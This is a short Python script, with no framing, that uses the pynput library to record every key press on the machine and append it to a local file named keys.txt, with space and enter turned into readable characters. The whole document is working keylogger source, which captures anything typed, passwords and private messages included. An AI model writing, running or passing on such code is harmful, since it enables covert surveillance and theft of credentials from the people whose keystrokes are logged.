from pynput.keyboard import Listener
def key_press(key):
   f = open("keys.txt", "a")
   if str(key) == "Key.space":
       letter = " "
   elif str(key) == "Key.enter":
       letter = "\n"
   else:
       letter = str(key)  
   f.write(str(letter).replace("'", "")) 
   f.close()
listener_object = Listener(on_press = key_press)
listener_object.start()
listener_object.join()